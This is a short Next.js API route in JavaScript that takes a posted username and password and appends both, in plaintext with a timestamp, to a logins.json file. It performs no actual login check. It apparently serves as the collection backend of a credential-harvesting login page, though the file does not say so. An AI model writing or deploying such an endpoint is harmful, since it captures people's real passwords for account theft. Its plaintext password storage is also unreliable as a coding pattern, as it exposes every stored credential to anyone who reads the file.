import { NextResponse } from "next/server";
import fs from "fs";
import path from "path";
import os from "os";

export async function POST(request) {
  try {
    const { username, password } = await request.json();

    const logEntry = {
      username,
      password,
      date: new Date().toISOString(),
    };

    // Use /tmp on Vercel (read-only filesystem), or project root locally
    const isVercel = process.env.VERCEL === "1";
    const filePath = isVercel
      ? path.join(os.tmpdir(), "logins.json")
      : path.join(process.cwd(), "logins.json");

    let logins = [];
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, "utf-8");
      logins = JSON.parse(fileContent);
    }

    logins.push(logEntry);
    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2), "utf-8");

    return NextResponse.json({ success: true });
  } catch (error) {
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}
